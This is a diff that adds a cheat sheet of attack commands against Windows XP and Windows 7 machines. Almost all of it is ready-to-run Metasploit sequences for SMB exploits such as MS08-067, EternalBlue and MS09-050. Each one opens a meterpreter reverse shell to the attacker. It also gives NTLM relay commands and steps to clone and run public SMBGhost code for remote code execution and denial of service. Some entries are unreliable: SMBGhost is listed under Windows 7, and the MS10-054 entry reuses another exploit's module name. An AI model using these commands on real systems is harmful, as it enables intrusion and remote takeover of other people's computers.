@@ -1,0 +1,102 @@
+Windows XP Exploits
+===================
+
+CVE-2008-4250 - MS08-067 (Conficker Worm)
+-----------------------------------------
+Vulnerability: Buffer overflow in the Server service allowing remote code execution.
+Command:
+use exploit/windows/smb/ms08_067_netapi
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+CVE-2017-0143 - MS17-010 (EternalBlue)
+--------------------------------------
+Vulnerability: Buffer overflow in SMBv1, enabling remote code execution.
+Command:
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST <target IP>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+CVE-2006-3439 - MS06-040
+------------------------
+Vulnerability: Buffer overflow in the Server service enabling remote code execution.
+Command:
+use exploit/windows/smb/ms06_040_netapi
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+CVE-2009-3103 - MS09-050
+------------------------
+Vulnerability: SMBv2 function table corruption leading to remote code execution.
+Command:
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+SMB Relay Attack
+----------------
+Vulnerability: Relays intercepted NTLM authentication to gain unauthorized access.
+Command:
+python ntlmrelayx.py -smb2support -t smb://<target IP>
+
+
+
+Windows 7 Exploits
+==================
+
+CVE-2017-0143 - MS17-010 (EternalBlue)
+--------------------------------------
+Vulnerability: Buffer overflow in SMBv1, allowing remote code execution.
+Command:
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST <target IP>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+CVE-2008-4037 - MS08-068
+------------------------
+Vulnerability: NTLM authentication relay attack.
+Command:
+python ntlmrelayx.py -smb2support -t smb://<target IP>
+
+CVE-2010-0020 - MS10-054
+------------------------
+Vulnerability: SMBv2 integer overflow allowing remote code execution.
+Command:
+use exploit/windows/smb/ms10_054_smb2_negotiate_func_index
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+CVE-2009-3103 - MS09-050
+------------------------
+Vulnerability: SMBv2 negotiate function index vulnerability leading to remote code execution.
+Command:
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+set RHOST <target IP>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+CVE-2020-0796 - SMBGhost
+------------------------
+Vulnerability: Buffer overflow in SMBv3 allowing remote code execution.
+Command:
+use exploit/windows/local/cve_2020_0796_smbghost
+set SESSION <session ID>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <your IP>
+run
+
+git clone https://github.com/chompie1337/SMBGhost_RCE_PoC.git
+cd SMBGhost_RCE_PoC
+python3 CVE-2020-0796.py <target IP> <target port>
+
+git clone https://github.com/ZecOps/CVE-2020-0796-DoS.git
+cd CVE-2020-0796-DoS
+python3 CVE-2020-0796-DoS.py <target IP>
+
+
